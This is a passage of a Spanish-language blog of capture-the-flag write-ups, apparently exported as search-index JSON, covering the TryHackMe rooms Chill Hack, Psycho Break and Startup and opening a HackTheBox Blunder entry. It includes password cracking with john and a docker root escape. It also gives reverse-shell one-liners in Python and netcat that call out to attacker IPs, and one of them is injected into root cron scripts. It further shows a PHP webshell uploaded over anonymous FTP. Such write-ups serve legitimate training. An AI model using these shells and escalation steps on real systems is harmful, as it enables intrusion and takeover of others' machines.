imagenes las cuales descargamos y analizamos localmente utilizando steghide, encontramos en el archivo JPG un archivo backup.zip el cual esta protegido por contraseña.\n1 2 3 4 5 6 7 8 kali@kali:~/thm/chillhack$ steghide extract -sf hacker-with-laptop_23-2147985341.jpg Enter passphrase: wrote extracted data to \u0026#34;backup.zip\u0026#34;. kali@kali:~/thm/chillhack$ unzip backup.zip Archive: backup.zip [backup.zip] source_code.php password: skipping: source_code.php incorrect password kali@kali:~/thm/chillhack$ Utilizamos zip2john y john para extraer y obtener la contraseña en texto plano.\n1 2 3 4 5 6 7 8 9 10 11 12 kali@kali:~/thm/chillhack$ zip2john backup.zip \u0026gt; hash_backupzip ver 2.0 efh 5455 efh 7875 backup.zip/source_code.php PKZIP Encr: 2b chk, TS_chk, cmplen=554, decmplen=1211, crc=69DC82F3 kali@kali:~/thm/chillhack$ john --wordlist=/usr/share/wordlists/rockyou.txt hash_backupzip Using default input encoding: UTF-8 Loaded 1 password hash (PKZIP [32/64]) Will run 2 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status [... snip ... ] (backup.zip/source_code.php) 1g 0:00:00:00 DONE (2020-12-09 19:33) 100.0g/s 1228Kp/s 1228Kc/s 1228KC/s total90..hawkeye Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed kali@kali:~/thm/chillhack$ ANURODH - USER Encontramos un archivo PHP, el cual contiene una contraseña codificada en base64.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; Admin Portal \u0026lt;/head\u0026gt; \u0026lt;title\u0026gt; Site Under Development ... \u0026lt;/title\u0026gt; \u0026lt;body\u0026gt; \u0026lt;form method=\u0026#34;POST\u0026#34;\u0026gt; Username: \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;name\u0026#34; placeholder=\u0026#34;username\u0026#34;\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt; Email: \u0026lt;input type=\u0026#34;email\u0026#34; name=\u0026#34;email\u0026#34; placeholder=\u0026#34;email\u0026#34;\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt; Password: \u0026lt;input type=\u0026#34;password\u0026#34; name=\u0026#34;password\u0026#34; placeholder=\u0026#34;password\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; name=\u0026#34;submit\u0026#34; value=\u0026#34;Submit\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;?php if(isset($_POST[\u0026#39;submit\u0026#39;])) { $email = $_POST[\u0026#34;email\u0026#34;]; $password = $_POST[\u0026#34;password\u0026#34;]; if(base64_encode($password) == \u0026#34;IWQwbnRLbjB[... snip ... ]zdzByZA==\u0026#34;) { $random = rand(1000,9999);?\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt; \u0026lt;form method=\u0026#34;POST\u0026#34;\u0026gt; Enter the OTP: \u0026lt;input type=\u0026#34;number\u0026#34; name=\u0026#34;otp\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; name=\u0026#34;submitOtp\u0026#34; value=\u0026#34;Submit\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;?php\tmail($email,\u0026#34;OTP for authentication\u0026#34;,$random); if(isset($_POST[\u0026#34;submitOtp\u0026#34;])) { $otp = $_POST[\u0026#34;otp\u0026#34;]; if($otp == $random) { echo \u0026#34;Welcome Anurodh!\u0026#34;; header(\u0026#34;Location: authenticated.php\u0026#34;); } else { echo \u0026#34;Invalid OTP\u0026#34;; } } } else { echo \u0026#34;Invalid Username or Password\u0026#34;; } } ?\u0026gt; \u0026lt;/html\u0026gt; Utilizamos esta contraseña para cambiar al usuario anurodh y obtener una shell con este usuario.\nPRIVILEGE ESCALATION Realizamos una pequeña enumeracion con id y vemos que el usuario pertenece al grupo docker. Utilizamos docker para obtener una shell con el usuario root y nuestra flag root.txt.\n1 docker run -it -v /:/mnt alpine chroot /mnt 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 root@d88bfe712182:~# cat proof.txt cat proof.txt {ROOT-FLAG: [... snip ... ]} Congratulations! You have successfully completed the challenge. ,-.-. ,----. _,.---._ .-._ ,----. ,-..-.-./ \\==\\ ,-.--` , \\ _.-. _.-. _,..---._ ,-.\u0026#39; , - `. /==/ \\ .-._ ,-.--` , \\ |, \\=/\\=|- |==||==|- _.-` .-,.\u0026#39;| .-,.\u0026#39;| /==/, - \\ /==/_, , - \\|==|, \\/ /, /==|- _.-` |- |/ |/ , /==/|==| `.-.|==|, | |==|, | |==| _ _\\==| .=. |==|- \\| ||==| `.-. \\, , _|==/==/_ , /|==|- | |==|- | |==| .=. |==|_ : ;=: - |==| , | -/==/_ , / | - - , |==|==| .-\u0026#39; |==|, | |==|, | |==|,| | -|==| , \u0026#39;=\u0026#39; |==| - _ |==| .-\u0026#39; \\ , - /==/|==|_ ,`-._|==|- `-._|==|- `-._ |==| \u0026#39;=\u0026#39; /\\==\\ - ,_ /|==| /\\ , |==|_ ,`-._ |- /\\ /==/ /==/ , //==/ - , ,/==/ - , ,/ |==|-, _`/ \u0026#39;.=\u0026#39;. - .\u0026#39; /==/, | |- /==/ , / `--` `--` `--`-----`` `--`-----\u0026#39;`--`-----\u0026#39; `-.`.____.\u0026#39; `--`--\u0026#39;\u0026#39; `--`./ `--`--`-----`` --------------------------------------------Designed By ------------------------------------------------------- | Anurodh Acharya | --------------------- Let me know if you liked it. Twitter - @acharya_anurodh Linkedin - www.linkedin.com/in/anurodh-acharya-b1937116a root@d88bfe712182:~# ","description":"Chill Hack es una maquina de TryHackMe, ejecutamos una shell inversa tras enumerar el sitio web. Obtuvimos acceso al siguiente usuario con un script ejecutado con sudo. Un pequeño reto de esteganografia nos permitio realizar nuevamente movimiento lateral. Finalmente escalamos privilegios utilizando docker.","id":85,"section":"posts","tags":["steganography","steghide","docker","sudo privesc","ftp"],"title":"TryHackMe - Chill Hack","uri":"https://sckull.github.io/posts/chillhack/"},{"content":"\rPsycho Break es una maquina de TryHackMe, es CTF Like por los multiples retos que se presentan.\nRoom Titulo Psycho Break Descripción Help Sebastian and his team of investigators to withstand the dangers that come ahead. Puntos 208 Dificultad Facil Maker shafdo NMAP Escaneo de puertos tcp, nmap nos muestra el puerto ftp (21), ssh (2) y el puerto http (80) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 # Nmap 7.80 scan initiated Wed Dec 9 21:22:51 2020 as: nmap -o allPorts psycho.thm Nmap scan report for psycho.thm (10.10.253.212) Host is up (0.28s latency). Not shown: 997 closed ports PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 80/tcp open http # Nmap done at Wed Dec 9 21:23:31 2020 -- 1 IP address (1 host up) scanned in 39.29 seconds # Nmap 7.80 scan initiated Wed Dec 9 21:23:49 2020 as: nmap -p21,22,80 -sV -sC -o servicePorts psycho.thm Nmap scan report for psycho.thm (10.10.253.212) Host is up (0.35s latency). PORT STATE SERVICE VERSION 21/tcp open ftp ProFTPD 1.3.5a 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 44:2f:fb:3b:f3:95:c3:c6:df:31:d6:e0:9e:99:92:42 (RSA) | 256 92:24:36:91:7a:db:62:d2:b9:bb:43:eb:58:9b:50:14 (ECDSA) |_ 256 34:04:df:13:54:21:8d:37:7f:f8:0a:65:93:47:75:d0 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Welcome To Becon Mental Hospital Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Dec 9 21:24:09 2020 -- 1 IP address (1 host up) scanned in 19.76 seconds HTTP Encontramos una pagina web en el puerto 80.\nEn la pagina inicial encontramos un comentario con una direccion.\n1 \u0026lt;!-- Sebastian sees a path through the darkness which leads to a room =\u0026gt; /sadistRoom --\u0026gt; En la nueva direccion se muestra un comentario en HTML y tambien al presionar el \u0026ldquo;link\u0026rdquo; mostrado en la pagina salta una alerta que muestra una \u0026ldquo;llave\u0026rdquo;, esa misma llave se encuentra en un archivo de javascript junto con una nueva direccion /lockerRoom/.\n1 \u0026lt;!-- To find more about Sadist visit https://theevilwithin.fandom.com/wiki/Sadist --\u0026gt; En esta nueva direccion encontramos un mensaje \u0026ldquo;codificado\u0026rdquo; y una nueva direccion en un \u0026ldquo;link\u0026rdquo; hacia un \u0026ldquo;mapa\u0026rdquo;.\nUtilizando guballa.de logramos obtener el texto codificado en vigenere.\nIngresamos al mapa y nos pregunta la llave, ingresamos el texto decodificado y nos muestra direcciones.\nEn Safe Heaven encontramos solamente imagenes.\nY en el codigo fuente un comentario.\n1 \u0026lt;!-- I think I\u0026#39;m having a terrible nightmare. Search through me and find it ... --\u0026gt; En Abandoned Room pide una llave.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos en Safe Heaven.\n1 2 3 4 5 kali@kali:~/thm/psychobreak$ gobuster dir -u http://psycho.thm/SafeHeaven/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -q -t 50 -x php,html,txt /imgs (Status: 301) /index.php (Status: 200) /index.php (Status: 200) /keeper (Status: 200) Encontramos una pagina la cual nos muestra una direccion hacia otra.\nEn esta ultima nos pide que ingresemos el lugar exacto de la imagen presentada.\nUtilizamos Google imagenes para poder subir y obtener la respuesta. Al ingresar la respuesta nos muestra una llave nueva, la cual ingresamos en /abandonedRoom/.\nNos muestra una nueva pagina y muestra otra direccion nueva.\nEn la direccion nueva nos muestra un timer y un mensaje RUN. RUN. Runn Get out of here !!!. En el codigo fuente de esta pagina encontramos dos comentarios.\nEl primer comentario habla sobre una \u0026ldquo;shell\u0026rdquo; dentro de la pagina.\n1 2 3 \u0026lt;!-- There is something called \u0026#34;shell\u0026#34; on current page maybe that\u0026#39;ll help you to get out of here !!!--\u0026gt; \u0026lt;!-- To find more about the Spider Lady visit https://theevilwithin.fandom.com/wiki/Laura_(Creature) --\u0026gt; Le pasamos ?shell=id en la pagina actual y retorno un comentario en el cual indica que el comando no esta permitido.\nRealizamos una pequeña enumeracion y encontramos una nueva direccion en la cual no hemos estado y se muestran varios archivos.\nEncontramos un archivo de texto y un archivo zip.\nYou made it. Escaping from Laura is not easy, good job .... Dentro del archivo zip encontramos un archivo de texto y una imagen, este ultimo al parecer es un archivo zip y no de imagen.\n1 2 3 4 5 6 7 8 9 kali@kali:~/thm/psychobreak$ cat helpme.txt From [... snip ...], Who ever sees this message \u0026#34;HELP Me\u0026#34;. Ruvik locked me up in this cell. Get the key on the table and unlock this cell. I\u0026#39;ll tell you what happened when I am out of this cell. kali@kali:~/thm/psychobreak$ file Table.jpg Table.jpg: Zip archive data, at least v2.0 to extract STEGO En el archivo zip (Table.jpg) encontramos una imagen un archivo de audio que parece ser codigo morse.\n1 2 3 4 kali@kali:~/thm/psychobreak$ unzip Table.jpg Archive: Table.jpg inflating: Joseph_Oda.jpg inflating: key.wav Utilizamos morsecode.world para obtener el texto.\nUtilizamos el texto encontrado para extraer informacion de la imagen con steghide, donde encontramos credenciales para el servicio FTP.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 kali@kali:~/thm/psychobreak$ steghide extract -sf Joseph_Oda.jpg Enter passphrase: wrote extracted data to \u0026#34;thankyou.txt\u0026#34;. kali@kali:~/thm/psychobreak$ cat thankyou.txt From [... snip ...], Thank you so much for freeing me out of this cell. Ruvik is nor good, he told me that his going to kill sebastian and next would be me. You got to help Sebastian ... I think you might find Sebastian at the Victoriano Estate. This note I managed to grab from Ruvik might help you get inn to the Victoriano Estate. But for some reason there is my name listed on the note which I don\u0026#39;t have a clue. -------------------------------------------- //\t\\\\ ||\t(NOTE) FTP Details\t|| || ==================\t|| ||\t|| ||\tUSER : [... snip ...]\t|| ||\tPASSWORD : [... snip ...]\t|| ||\t|| \\\\\t// -------------------------------------------- Good luck, Be carefull !!! kali@kali:~/thm/psychobreak$ FTP Ingresamos al servicio FTP con las credenciales encontradas y vemos dos archivos, uno de ellos es un ejecutable, el segundo parece ser un wordlist.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 ftp\u0026gt; pwd 257 \u0026#34;/\u0026#34; is the current directory ftp\u0026gt; ls -lah 200 PORT command successful 150 Opening ASCII mode data connection for file list drwxr-xr-x 2 0 0 4.0k Aug 13 15:20 . drwxr-xr-x 2 0 0 4.0k Aug 13 15:20 .. -rwxr-xr-x 1 joseph joseph 11.1M Aug 13 15:12 program -rw-r--r-- 1 joseph joseph 974 Aug 13 15:20 random.dic 226 Transfer complete ftp\u0026gt; get program local: program remote: program 200 PORT command successful 150 Opening BINARY mode data connection for program (11641688 bytes) 226 Transfer complete 11641688 bytes received in 70.65 secs (160.9213 kB/s) ftp\u0026gt; get random.dic local: random.dic remote: random.dic 200 PORT command successful 150 Opening BINARY mode data connection for random.dic (974 bytes) 226 Transfer complete 974 bytes received in 0.00 secs (6.6826 MB/s) ftp\u0026gt; exit 221 Goodbye. kali@kali:~/thm/psychobreak$ file program program: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=294d1f19a085a730da19a6c55788ec08c2187039, stripped kali@kali:~/thm/psychobreak$ head random.dic 000000 111111 123123 123321 1234 12345 123456 1234567 12345678 123456789 kali@kali:~/thm/psychobreak$ Al ejecutar el programa nos pide una \u0026ldquo;palabra\u0026rdquo;. Utilizando el diccionario y bash logramos obtener la palabra correcta y nos muestra el siguiente mensaje.\n1 2 3 4 5 6 7 8 9 10 11 kali@kali:~/thm/psychobreak/ftp$ while read line; do ./program \u0026#34;$line\u0026#34; \u0026amp;\u0026amp; echo $line; done \u0026lt; random.dic 000000 =\u0026gt; Incorrect 000000 [... snip ... ] [... snip ... ] =\u0026gt; Correct Well Done !!! Decode This =\u0026gt; 55 444 3 6 2 66 7777 7 2 7777 7777 9 666 777 3 444 7777 7777 666 7777 8 777 2 66 4 33 El mensaje incluye unos numeros lo que parecen ser un mensaje codificado con numeros que representan un teclado de telefono.\nUtilizamos dcode.fr - multi-tap phone para obtener el texto.\nKIDMAN - USER Con la palabra y el mensaje decodificado intentamos ingresar mediante el servicio SSH con estas \u0026ldquo;credenciales\u0026rdquo;, logrando obtener una shell y nuestra flag user.txt.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion al archivo /etc/crontab y encontramos un cron que se ejecuta cada dos minutos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 kidman@evilwithin:~$ cat /etc/crontab # /etc/crontab: system-wide crontab # Unlike any other crontab you don\u0026#39;t have to run the `crontab\u0026#39; # command to install the new version when you edit this file # and files in /etc/cron.d. These files also have username fields, # that none of the other crontabs do. SHELL=/bin/sh PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin # m h dom mon dow user\tcommand 17 *\t* * *\troot cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.hourly 25 6\t* * *\troot\ttest -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.daily ) 47 6\t* * 7\troot\ttest -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.weekly ) 52 6\t1 * *\troot\ttest -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.monthly ) */2 * * * * root python3 /var/.the_eye_of_ruvik.py El cron ejecuta un archivo de python, el cual escribe una \u0026ldquo;oracion\u0026rdquo; dentro del archivo .the_eye.txt. Tenemos permisos de escritura en el archivo de python por lo que lo modificamos para ejecutar una shell inversa.\n1 2 3 4 5 6 7 8 9 .the_eye_of_ruvik.py #!/usr/bin/python3 import subprocess import random stuff = [\u0026#34;I am watching you.\u0026#34;,\u0026#34;No one can hide from me.\u0026#34;,\u0026#34;Ruvik ...\u0026#34;,\u0026#34;No one shall hide from me\u0026#34;,\u0026#34;No one can escape from me\u0026#34;] sentence = \u0026#34;\u0026#34;.join(random.sample(stuff,1)) subprocess.call(\u0026#34;echo %s \u0026gt; /home/kidman/.the_eye.txt\u0026#34;%(sentence),shell=True) 1 2 subprocess.call(\u0026#34;echo %s \u0026gt; /home/kidman/.the_eye.txt\u0026#34;%(sentence),shell=True) import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;10.1.1.1\u0026#34;,1338));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.system(\u0026#34;/bin/sh -i\u0026#34;) Logramos obtener una shell con el usuario root y nuestra flag root.txt.\n","description":"Psycho Break es una maquina de TryHackMe, es CTF Like por los multiples retos que se presentan.","id":86,"section":"posts","tags":["steganography","steghide","cronjob","ftp"],"title":"TryHackMe - Psycho Break","uri":"https://sckull.github.io/posts/psychobreak/"},{"content":"\rStartup es una maquina de TryHackMe utilizamos FTP para subir una webshell para luego obtener una shell. Accedimos con un segundo usuario analizando un archivo PCAP. Finalmente ejecutamos una shell inversa editando un script utilizado por un CronJob.\nRoom Titulo Startup Descripción Abuse traditional vulnerabilities via untraditional means. Puntos 140 Dificultad Facil Maker elbee NMAP Escaneo de puertos tcp, nmap nos muestra el puerto ftp (21), ssh (22) y el puerto http (80) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 # Nmap 7.80 scan initiated Wed Dec 9 02:42:39 2020 as: nmap -p- --min-rate 1000 -o allPorts startup.thm Nmap scan report for startup.thm (10.10.134.232) Host is up (0.27s latency). Not shown: 64048 closed ports, 1484 filtered ports PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 80/tcp open http # Nmap done at Wed Dec 9 02:45:09 2020 -- 1 IP address (1 host up) scanned in 150.15 seconds # Nmap 7.80 scan initiated Wed Dec 9 02:45:44 2020 as: nmap -p80,21,22,80 -sV -sC -o servicePorts startup.thm Nmap scan report for startup.thm (10.10.134.232) Host is up (0.27s latency). PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-anon: Anonymous FTP login allowed (FTP code 230) | drwxrwxrwx 2 65534 65534 4096 Nov 12 04:53 ftp [NSE: writeable] | -rw-r--r-- 1 0 0 251631 Nov 12 04:02 important.jpg |_-rw-r--r-- 1 0 0 208 Nov 12 04:53 notice.txt | ftp-syst: | STAT: | FTP server status: | Connected to 10.2.29.162 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 4 | vsFTPd 3.0.3 - secure, fast, stable |_End of status 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA) | 256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA) |_ 256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Maintenance Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Dec 9 02:46:02 2020 -- 1 IP address (1 host up) scanned in 17.95 seconds FTP Ingresamos al servicio FTP con las \u0026ldquo;credenciales\u0026rdquo; de anonymous (anonymous:anonymous), donde encontramos algunos archivos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 kali@kali:~/thm/startup$ ftp startup.thm Connected to startup.thm. 220 (vsFTPd 3.0.3) Name (startup.thm:kali): anonymous 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls -lah 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x 3 65534 65534 4096 Nov 12 04:53 . drwxr-xr-x 3 65534 65534 4096 Nov 12 04:53 .. -rw-r--r-- 1 0 0 5 Nov 12 04:53 .test.log drwxrwxrwx 2 65534 65534 4096 Nov 12 04:53 ftp -rw-r--r-- 1 0 0 251631 Nov 12 04:02 important.jpg -rw-r--r-- 1 0 0 208 Nov 12 04:53 notice.txt 226 Directory send OK. ftp\u0026gt; get .test.log local: .test.log remote: .test.log 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for .test.log (5 bytes). 226 Transfer complete. 5 bytes received in 0.00 secs (13.9909 kB/s) ftp\u0026gt; get important.jpg local: important.jpg remote: important.jpg 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for important.jpg (251631 bytes). 226 Transfer complete. 251631 bytes received in 1.15 secs (214.0925 kB/s) ftp\u0026gt; get notice.txt local: notice.txt remote: notice.txt 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for notice.txt (208 bytes). 226 Transfer complete. 208 bytes received in 0.00 secs (259.4189 kB/s) ftp\u0026gt; cd ftp 250 Directory successfully changed. ftp\u0026gt; ls -lah 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxrwxrwx 2 65534 65534 4096 Nov 12 04:53 . drwxr-xr-x 3 65534 65534 4096 Nov 12 04:53 .. 226 Directory send OK. ftp\u0026gt; cd .. 250 Directory successfully changed. ftp\u0026gt; pwd 257 \u0026#34;/\u0026#34; is the current directory ftp\u0026gt; Imagen encontrada en FTP\nUno de los archivos contiene un mensaje en el cual indica que \u0026ldquo;alguien esta compartiendo archivos (memes) en la carpeta (de ftp) y estos archivos se muestran en la pagina web\u0026rdquo;. Lo cual indica que en cierta parte de la pagina web se muestran los archivos que se encuentran en el servicio ftp.\n1 2 3 4 5 kali@kali:~/thm/startup$ cat notice.txt Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus. kali@kali:~/thm/startup$ cat .test.log test kali@kali:~/thm/startup$ HTTP Encontramos una pagina web en el puerto 80 la cual no contiene informacion interesante.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 kali@kali:~/thm/startup$ gobuster dir -u http://startup.thm/ -w /usr/share/wordlists/dirb/common.txt -q -t 15 -x php,html,txt /files (Status: 301) /index.html (Status: 200) /index.html (Status: 200) /server-status (Status: 403) kali@kali:~/thm/startup$ Como indicaba el mensaje en uno de los archivos, se muestran archivos (que se encuentran en el servicio FTP) en la pagina web.\nWWW-DATA - USER Mediante una mini webshell ejecutamos comandos en la maquina, subiendo esta en la carpeta ftp/ del servicio FTP, ya que tenemos acceso mediante el \u0026ldquo;usuario\u0026rdquo; anonymous.\n1 \u0026lt;?php echo \u0026#34;\u0026lt;pre\u0026gt;\u0026#34;; system($_GET[\u0026#39;cmd\u0026#39;]); ?\u0026gt; Mini webshell a la carpeta ftp/.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 ftp\u0026gt; ls -lah 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x 3 65534 65534 4096 Nov 12 04:53 . drwxr-xr-x 3 65534 65534 4096 Nov 12 04:53 .. -rw-r--r-- 1 0 0 5 Nov 12 04:53 .test.log drwxrwxrwx 2 65534 65534 4096 Nov 12 04:53 ftp -rw-r--r-- 1 0 0 251631 Nov 12 04:02 important.jpg -rw-r--r-- 1 0 0 208 Nov 12 04:53 notice.txt 226 Directory send OK. ftp\u0026gt; cd ftp 250 Directory successfully changed. ftp\u0026gt; put shell.php5 local: shell.php5 remote: shell.php5 200 PORT command successful. Consider using PASV. 150 Ok to send data. 226 Transfer complete. 45 bytes sent in 0.00 secs (392.3689 kB/s) ftp\u0026gt; ls -lah 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxrwxrwx 2 65534 65534 4096 Dec 09 08:01 . drwxr-xr-x 3 65534 65534 4096 Nov 12 04:53 .. -rwxrwxr-x 1 112 118 45 Dec 09 08:01 shell.php5 226 Directory send OK. ftp\u0026gt; El archivo se muestra en la direccion de la pagina /files/ftp.\nAl ejecutar un comando se muestra en pantalla.\nEjecutamos una shell inversa y ponemos a la escucha netcat en el puerto especificado.\nN: \u0026ldquo;Es posible ejecutar la shell inversa insertando esta en el codigo de la mini webshell.\u0026rdquo;\n1 python -c \u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;10.10.10.10\u0026#34;,1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;]);\u0026#39; Obtenemos una shell con usuario www-data.\nEn la maquina encontramos algunos archivos interesantes, el primero solo menciona un ingrediente principal, el segundo es un archivo de captura de paquetes.\n1 2 3 4 5 6 7 8 9 10 11 12 www-data@startup:/$ cat recipe.txt cat recipe.txt Someone asked what our main ingredient to our spice soup is today. I figured I can\u0026#39;t keep it a secret forever and told him it was ... spoiler ... . www-data@startup:/$ www-data@startup:/incidents$ ls -lah ls -lah total 40K drwxr-xr-x 2 www-data www-data 4.0K Nov 12 04:53 . drwxr-xr-x 25 root root 4.0K Dec 9 07:39 .. -rwxr-xr-x 1 www-data www-data 31K Nov 12 04:53 suspicious.pcapng www-data@startup:/incidents$ Utilizamos wireshark para analizar el segundo archivo, en dicho archivo encontramos que se subió y se ejecutaron comandos mediante una shell, en los comandos encontrados se muestra la contraseña que aparentemente es del usuario Lennie.\nLENNIE - USER Utilizamos esta contraseña para cambiar al usuario Lennie y obtener nuestra flag user.txt.\nPRIVILEGE ESCALATION Realizamos una pequeña enumeracion en la carpeta del usuario Lennie y encontramos archivos que son propiedad del usuario root, en el primero de ellos realiza un echo al archivo startup_list.txt y ejecuta el archivo /etc/print.sh el cual contiene un echo, el segundo archivo (startup_list.txt) no contiene nada.\n1 2 3 4 5 6 7 8 9 10 11 12 13 lennie@startup:~/scripts$ cat planner.sh #!/bin/bash echo $LIST \u0026gt; /home/lennie/scripts/startup_list.txt /etc/print.sh lennie@startup:~/scripts$ cat startup_list.txt lennie@startup:~/scripts$ lennie@startup:~/scripts$ ls -lah /etc/print.sh -rwx------ 1 lennie lennie 25 Nov 12 04:53 /etc/print.sh lennie@startup:~/scripts$ cat /etc/print.sh #!/bin/bash echo \u0026#34;Done!\u0026#34; lennie@startup:~/scripts$ Ejecutamos pspy para verificar si el archivo planner.sh es ejecutado por algun cron del usuario root, lo cual se confirmo.\nYa que el archivo print.sh es propiedad del archivo Lennie, vamos a editar este e insertar una shell inversa y poner a la escucha netcat en el puerto especificado.\n1 echo \u0026#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.10.10.10 1338 \u0026gt;/tmp/f\u0026#34; \u0026gt;\u0026gt; /etc/print.sh Obtenemos una shell con el usuario root y nuestra flat root.txt.\n","description":"Startup es una maquina de TryHackMe utilizamos FTP para subir una webshell para luego obtener una shell. Accedimos con un segundo usuario analizando un archivo PCAP. Finalmente ejecutamos una shell inversa editando un script utilizado por un CronJob.","id":87,"section":"posts","tags":["pspy","webshell","wireshark"],"title":"TryHackMe - Startup","uri":"https://sckull.github.io/posts/startup/"},{"content":"\rBlunder es una maquina de HackTheBox, Bludit CMS esta corriendo y su version tiene multiples vulnerabilidades, aprovechamos una de ellas para realizar un ataque de contraseñas utilizando un diccionario generado con Cewl, luego ejecutamos una shell inversa. Realizamos movimiento lateral con contraseñas almacenadas por Bludit. Una vulnerabilidad de sudo nos permitió obtener acceso privilegiado.\nInformacion de la Maquina Nombre Blunder OS Linux Puntos 20 Dificultad Facil IP 10.10.10.191 Maker egotisticalSW\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[6.5, 5.9, 7.3, 2.7, 4.1],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[1, 10, 10, 0, 0],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 